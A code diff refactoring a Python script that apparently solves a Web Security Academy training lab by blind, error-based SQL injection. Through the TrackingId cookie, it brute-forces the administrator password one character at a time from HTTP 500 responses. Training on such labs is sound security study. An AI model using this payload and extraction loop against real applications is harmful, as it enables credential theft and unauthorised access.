@@ -28,48 +28,57 @@ f"xyz' union select case when (SUBSTR((select password from users where username
 """
 
 # TODO: change url to challenge url
-url = "https://ac3c1f331ee30bb9809058ec00aa00a8.web-security-academy.net/"
-
-
-def get_candidates_alphanumeric():
-    """this challenge only uses lowercase and numbers.
-    To be sure - and for future copy/paste - don't forget the uppercase letters"""
-    return string.ascii_lowercase + "0123456789" + string.ascii_uppercase
+url = "https://ac881f5a1f0f744480027588006700f4.web-security-academy.net/"
 
 
 def bruteforce_password(candidates):
     """getting the password, one character at a time"""
 
     password = ""
-    pos = len(password)
+    pos = 0
     while True:
         pos += 1
-        for candidate in candidates:
-            to_try = password + candidate
+        character = bruteforce_password_character(candidates, pos)
 
-            injection = f"xyz' union select case when (SUBSTR((select password from users where username = 'administrator'), 1, {len(to_try)}) = '{to_try}') then to_char(1/0) else null end from dual"
-
-            payload = injection + " -- "
-            # print(f"SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '{payload}'")
-
-            cookies = {"session": "whatever",  # no valid session needed
-                       "TrackingId": payload, }
-
-            res = requests.get(url, cookies=cookies, timeout=5)
-
-            if res.status_code == 500:
-                password += candidate
-                print(password)
-                break
-            else:
-                print(".", end="")
+        if type(character) == str:
+            password += character
+            print(password)
         else:
-            print(f" tried all candidates for position {pos}, complete password:", password)
             break
 
-        # unreachable, due to breaks
-
     return password
+
+
+def bruteforce_password_character(candidates, pos):
+    for candidate in candidates:
+        if try_candidate(pos, candidate):
+            return candidate
+    else:
+        print(f" tried all candidates for position {pos}")
+        return False
+
+
+def try_candidate(pos, candidate):
+    payload = f"xyz' union select case when (SUBSTR((select password from users where username = 'administrator'), {pos}, 1) = '{candidate}') then to_char(1/0) else null end from dual -- "
+    # print(f"SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '{payload}'")
+
+    cookies = {"session": "whatever", "TrackingId": payload}
+
+    with requests.get(url, cookies=cookies, timeout=3) as res:
+        if res.status_code == 504:
+            raise Exception("Server returned 504")
+
+        if res.status_code != 500:
+            print(".", end="")
+            return False
+
+        return True
+
+
+def get_candidates_alphanumeric():
+    """this challenge only uses lowercase and numbers.
+    To be sure - and for future copy/paste - don't forget the uppercase letters"""
+    return string.ascii_lowercase + "0123456789" + string.ascii_uppercase
 
 
 if __name__ == '__main__':
